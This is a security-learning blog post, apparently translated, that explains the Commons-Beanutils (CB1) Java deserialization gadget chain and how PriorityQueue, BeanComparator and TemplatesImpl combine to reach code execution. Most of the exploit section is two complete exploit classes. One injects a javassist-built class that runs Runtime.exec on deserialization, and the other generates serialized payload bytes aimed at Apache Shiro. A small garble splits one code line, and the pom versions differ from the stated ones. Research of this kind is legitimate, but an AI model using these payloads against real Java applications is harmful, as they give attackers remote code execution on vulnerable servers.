# Java Security Learning—CommonsBeanutils Chain

Author: H3rmesk1t

Data: 2022.2.11

## Preface
`Commons-Beanutils` is a toolkit provided by Apache for operating `Java beans`. The most commonly used tool classes are: `MethodUtils`/`ConstructorUtils`/`PropertyUtils`/`BeanUtils`/`ConvertUtils`, etc. When learning the `CommonsCollections2` chain before, the malicious `java.util.Comparator` object was mainly passed into the `java.util.PriorityQueue` object, resulting in the malicious `java.util.Comparator` method of malicious `java.util.Comparator` during the deserialization process. The general process of deserialization using the chain is:

```java
PriorityQueue ->
TransformingComparator ->
ChainedTransformer ->
InstantiateTransformer ->
TemplatesImpl
```

In the deserialization chain, the `ChainedTransformer` is triggered by `TransformingComparator` to instantiate `TemplatesImpl`, here `CommonsBeanutils` is used to bypass the intermediate complex process and directly instantiate `TemplatesImpl`.


## Environment construction
 1. `JDK` version: JDK1.8u66
 2. `Commons-Collections4` version: 3.1
 3. `Commons-Beanutils` version: 1.9.2
 4. `Commons-Logging` version: 1.1

Use `maven` to build it. First create a `Maven` project, without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>3.2</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>
    </dependencies>

</project>
```


## Pre-knowledge
### PropertyUtils
The `org.apache.commons.beanutils.PropertyUtils` class uses the Java reflection API to call the practical methods of the common properties `getter` and `setter` operations on the Java object. The specific usage logic of these methods is actually implemented by the `org.apache.commons.beanutils.PropertyUtilsBean`. This class has a static method `getProperty`, which receives two parameters `bean` (class object) and `name` (property name). The method will return the value of this property of this class. This is similar to a `Field` reflection tool class, but it does not use reflection to directly use reflection to get the value, but uses reflection to call its `getter` method to get the value.


![](./images/1.png)

### BeanComparator
`BeanComparator` is a class provided by `Commons-Beanutils` to compare whether two `JavaBeans` are equal, and it implements the `java.util.Comparator` interface. `BeanComparator` can specify the `property` property name and the `comparator` comparisonr when initializing, and if not specified, the default is `ComparableComparator`.

![](./images/2.png)

The `compare` method of `BeanComparator` receives two objects, calls the `PropertyUtils.getProperty` method respectively to obtain the value of the `property` property of the two objects, and then calls the `internalCompare` method of `comparator` initialized during instantiation to compare.

![](./images/3.png)

## ExploitWithCC
Based on the above idea, the final attack code is constructed as follows:

```java
package CommonsBeanUtils1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/11 4:05 pm
 */
public class CommonsBeanUtilsWithCC {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void CB() throws Exception {

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("CBEvilWithCC");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");");

        byte[] bytes = ctClass.toBytecode();
        byte[][] targetBytes = new byte[][]{bytes};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "h3rmesk1t");
        setFieldValue(templates, "_bytecodes", targetBytes);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator();
        Priority
Queue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        try {
            // Serialization operation
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CBEvilWithCC.bin"));
            outputStream.writeObject(queue);
            outputStream.close();
            // Deserialization operation
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CBEvilWithCC.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {

        CB();
    }
}
```

![](./images/4.png)

## ExploitWithoutCC
The code in ExploitWithoutCC can successfully construct deserialization utilization, but the default `BeanComparator` is `ComparableComparator`, which is a class in `CommonCollections`, which leads to a trigger chain of `CB`, but it depends on `CC` at the same time. This has added many restrictions on utilization. Therefore, in order to change this situation, when instantiating `BeanComparator`, it is given a `JDK` that comes with the `JDK` and implement the `Serializable` interface, such as `java.util.Collections$ReverseComparator` and `java.lang.String$CaseInsensitiveComparator`. Instantiate `Comparator` by reflection and specify when `BeanComparator` is initialized.

Here is a `Payload` of the masters:

```java
package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutils1Shiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==========================
        // Generate serialized strings
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}
```

## Call chain

```java
PriorityQueue.readObject()
    BeanComparator.compare()
            PropertyUtils.getProperty()
                PropertyUtilsBean.getProperty()
                    TemplatesImpl.getOutputProperties()
```

## Summarize
 1. Usage instructions:
    - `PriorityQueue` is called `compare` of `BeanComparator` when deserializing, using this method to launch the `getOutputProperties` method called `TemplatesImpl` to trigger instantiation of the malicious class.
 2. Gadget summary:
    - kick-off gadget: java.util.PriorityQueue#readObject
    - sink gadget: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
    - chain gadget: org.apache.commons.beanutils.BeanComparator#compare